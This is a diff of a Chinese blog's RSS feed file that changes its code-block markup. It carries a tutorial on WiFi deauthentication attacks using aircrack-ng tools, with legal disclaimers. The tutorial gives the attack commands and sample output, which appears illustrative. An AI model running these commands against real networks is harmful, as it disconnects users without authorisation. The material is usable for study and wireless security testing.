@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>kali on LEl_FENG的博客</title><link>https://blog.xpdbk.com/tags/kali/</link><description>Recent content in kali on LEl_FENG的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>XiaoPang版权所有</copyright><lastBuildDate>Mon, 17 Jul 2023 00:00:00 +0700</lastBuildDate><atom:link href="https://blog.xpdbk.com/tags/kali/index.xml" rel="self" type="application/rss+xml"/><item><title>使用Kali Linux进行WiFi Deauthentication攻击的学习</title><link>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</link><pubDate>Mon, 17 Jul 2023 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</guid><description>&lt;blockquote>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>kali on LEl_FENG的博客</title><link>https://blog.xpdbk.com/tags/kali/</link><description>Recent content in kali on LEl_FENG的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>LEl_FENG版权所有</copyright><lastBuildDate>Mon, 17 Jul 2023 00:00:00 +0700</lastBuildDate><atom:link href="https://blog.xpdbk.com/tags/kali/index.xml" rel="self" type="application/rss+xml"/><item><title>使用Kali Linux进行WiFi Deauthentication攻击的学习</title><link>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</link><pubDate>Mon, 17 Jul 2023 00:00:00 +0700</pubDate><guid>https://blog.xpdbk.com/post/kali-linux-wifi-deauthentication-attack-guide/</guid><description>&lt;blockquote>
 &lt;p>仅为技术科普，请勿用于非法用途&lt;/p>
 &lt;p>内容未隐讳任何个人、群体、公司。非文学作品，请勿用于阅读理解的练习&lt;/p>
 &lt;p>根据《计算机软件保护条例》第十七条，本站所有软件请仅用于学习研究用途&lt;/p>
@@ -36,67 +36,136 @@
 &lt;ol>
 &lt;li>
 &lt;p>打开终端并启用监视模式。您可以使用以下命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">sudo airmon-ng start wlan0
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">sudo airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
 &lt;li>
 &lt;p>扫描可用的WiFi网络。您可以使用以下命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">sudo airodump-ng wlan0mon
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这将显示周围的所有WiFi网络的详细信息，包括SSID、BSSID和信号强度等信息。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">sudo airodump-ng wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这将显示周围的所有WiFi网络的详细信息，包括SSID、BSSID和信号强度等信息。&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>找到您要攻击的WiFi网络的BSSID和信道。您可以在&lt;code>airodump-ng&lt;/code>的输出中找到这些信息。&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>执行Deauthentication攻击。您可以使用以下命令：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln">1&lt;/span>&lt;span class="cl">sudo aireplay-ng --deauth &amp;lt;数量&amp;gt; -a &amp;lt;BSSID&amp;gt; -c &amp;lt;目标设备的MAC地址&amp;gt; wlan0mon
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在上面的命令中，&lt;code>&amp;lt;数量&amp;gt;&lt;/code>表示要发送的Deauthentication帧的数量，&lt;code>&amp;lt;BSSID&amp;gt;&lt;/code>表示要攻击的WiFi网络的BSSID，&lt;code>&amp;lt;目标设备的MAC地址&amp;gt;&lt;/code>表示要攻击的设备的MAC地址。&lt;code>wlan0mon&lt;/code>是启用了监视模式的接口名称。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">sudo aireplay-ng --deauth &amp;lt;数量&amp;gt; -a &amp;lt;BSSID&amp;gt; -c &amp;lt;目标设备的MAC地址&amp;gt; wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在上面的命令中，&lt;code>&amp;lt;数量&amp;gt;&lt;/code>表示要发送的Deauthentication帧的数量，&lt;code>&amp;lt;BSSID&amp;gt;&lt;/code>表示要攻击的WiFi网络的BSSID，&lt;code>&amp;lt;目标设备的MAC地址&amp;gt;&lt;/code>表示要攻击的设备的MAC地址。&lt;code>wlan0mon&lt;/code>是启用了监视模式的接口名称。&lt;/p>
 &lt;p>您可以使用&lt;code>aireplay-ng&lt;/code>的其他选项来更改攻击的参数，例如更改攻击间隔时间或使用不同的攻击模式等。&lt;/p>
 &lt;/li>
 &lt;/ol>
 &lt;p>&lt;strong>输出的结果&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="ln"> 1&lt;/span>&lt;span class="cl">user@kali:~$ sudo airmon-ng start wlan0
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 2&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 3&lt;/span>&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> user:
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 4&lt;/span>&lt;span class="cl">Found &lt;span class="m">5&lt;/span> processes that could cause trouble.
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 5&lt;/span>&lt;span class="cl">If airodump-ng, aireplay-ng or airtun-ng stops working after
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 6&lt;/span>&lt;span class="cl">a short period of time, you may want to run &lt;span class="s1">&amp;#39;airmon-ng check kill&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 7&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 8&lt;/span>&lt;span class="cl"> PID Name
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 9&lt;/span>&lt;span class="cl"> &lt;span class="m">789&lt;/span> NetworkManager
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">10&lt;/span>&lt;span class="cl"> &lt;span class="m">890&lt;/span> wpa_supplicant
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">11&lt;/span>&lt;span class="cl"> &lt;span class="m">901&lt;/span> dhclient
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">12&lt;/span>&lt;span class="cl"> &lt;span class="m">1234&lt;/span> avahi-daemon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">13&lt;/span>&lt;span class="cl"> &lt;span class="m">1235&lt;/span> avahi-daemon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">14&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">15&lt;/span>&lt;span class="cl">PHY Interface Driver Chipset
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">16&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">17&lt;/span>&lt;span class="cl">phy0 wlan0 ath9k Qualcomm Atheros AR9485 Wireless Network Adapter &lt;span class="o">(&lt;/span>rev 01&lt;span class="o">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">18&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">19&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 monitor mode vif enabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0 on &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0mon&lt;span class="o">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">20&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 station mode vif disabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0&lt;span class="o">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">21&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">22&lt;/span>&lt;span class="cl">user@kali:~$ sudo airodump-ng wlan0mon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">23&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">24&lt;/span>&lt;span class="cl"> CH &lt;span class="m">6&lt;/span> &lt;span class="o">][&lt;/span> Elapsed: &lt;span class="m">1&lt;/span> min &lt;span class="o">][&lt;/span> 2023-08-03 14:00 &lt;span class="o">][&lt;/span> fixed channel wlan0mon: -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">25&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">26&lt;/span>&lt;span class="cl"> BSSID PWR RXQ Beacons &lt;span class="c1">#Data, #/s CH MB ENC CIPHER AUTH ESSID&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">27&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">28&lt;/span>&lt;span class="cl"> 00:11:22:33:44:55 -40 &lt;span class="m">100&lt;/span> &lt;span class="m">600&lt;/span> &lt;span class="m">100&lt;/span> &lt;span class="m">2&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">29&lt;/span>&lt;span class="cl"> AA:BB:CC:DD:EE:FF -50 &lt;span class="m">0&lt;/span> &lt;span class="m">500&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-2
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">30&lt;/span>&lt;span class="cl"> FF:FF:FF:FF:FF:FF -60 &lt;span class="m">0&lt;/span> &lt;span class="m">400&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-3
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">31&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">32&lt;/span>&lt;span class="cl"> BSSID STATION PWR Rate Lost Frames Probe
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">33&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">34&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> AA:BB:CC:DD:EE:FF -1 -1 - -1 - -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">35&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> BB:CC:DD:EE:FF:AA -1 -1 - -1 - -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">36&lt;/span>&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> CC:DD:EE:FF:AA:BB -1 -1 - -1 - -1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">37&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">38&lt;/span>&lt;span class="cl">user@kali:~$ sudo aireplay-ng --deauth &lt;span class="m">10&lt;/span> -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">39&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">40&lt;/span>&lt;span class="cl">14:01:23 Waiting &lt;span class="k">for&lt;/span> beacon frame &lt;span class="o">(&lt;/span>BSSID: 00:11:22:33:44:55&lt;span class="o">)&lt;/span> on channel &lt;span class="m">6&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">41&lt;/span>&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span> 0&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">42&lt;/span>&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="注意事项">注意事项&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">user@kali:~$ sudo airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> user:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Found &lt;span class="m">5&lt;/span> processes that could cause trouble.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">If airodump-ng, aireplay-ng or airtun-ng stops working after
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a short period of time, you may want to run &lt;span class="s1">&amp;#39;airmon-ng check kill&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PID Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">789&lt;/span> NetworkManager
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">890&lt;/span> wpa_supplicant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">901&lt;/span> dhclient
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1234&lt;/span> avahi-daemon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1235&lt;/span> avahi-daemon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PHY Interface Driver Chipset
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phy0 wlan0 ath9k Qualcomm Atheros AR9485 Wireless Network Adapter &lt;span class="o">(&lt;/span>rev 01&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 monitor mode vif enabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0 on &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0mon&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>mac80211 station mode vif disabled &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>phy0&lt;span class="o">]&lt;/span>wlan0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user@kali:~$ sudo airodump-ng wlan0mon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CH &lt;span class="m">6&lt;/span> &lt;span class="o">][&lt;/span> Elapsed: &lt;span class="m">1&lt;/span> min &lt;span class="o">][&lt;/span> 2023-08-03 14:00 &lt;span class="o">][&lt;/span> fixed channel wlan0mon: -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BSSID PWR RXQ Beacons &lt;span class="c1">#Data, #/s CH MB ENC CIPHER AUTH ESSID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 00:11:22:33:44:55 -40 &lt;span class="m">100&lt;/span> &lt;span class="m">600&lt;/span> &lt;span class="m">100&lt;/span> &lt;span class="m">2&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> AA:BB:CC:DD:EE:FF -50 &lt;span class="m">0&lt;/span> &lt;span class="m">500&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> FF:FF:FF:FF:FF:FF -60 &lt;span class="m">0&lt;/span> &lt;span class="m">400&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">6&lt;/span> 54e. WPA2 CCMP PSK Wifi-3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BSSID STATION PWR Rate Lost Frames Probe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> AA:BB:CC:DD:EE:FF -1 -1 - -1 - -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> BB:CC:DD:EE:FF:AA -1 -1 - -1 - -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>not associated&lt;span class="o">)&lt;/span> CC:DD:EE:FF:AA:BB -1 -1 - -1 - -1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user@kali:~$ sudo aireplay-ng --deauth &lt;span class="m">10&lt;/span> -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">14:01:23 Waiting &lt;span class="k">for&lt;/span> beacon frame &lt;span class="o">(&lt;/span>BSSID: 00:11:22:33:44:55&lt;span class="o">)&lt;/span> on channel &lt;span class="m">6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span> 0&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">14:01:23 Sending &lt;span class="m">10&lt;/span> directed DeAuth. STMAC: &lt;span class="o">[&lt;/span>AA:BB:CC:DD:EE:FF&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10&lt;span class="p">|&lt;/span>&lt;span class="m">10&lt;/span> ACKs&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="注意事项">注意事项&lt;/h2>
 &lt;p>在执行WiFi Deauthentication攻击时，请注意以下几点：&lt;/p>
 &lt;ul>
 &lt;li>请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。&lt;/li>
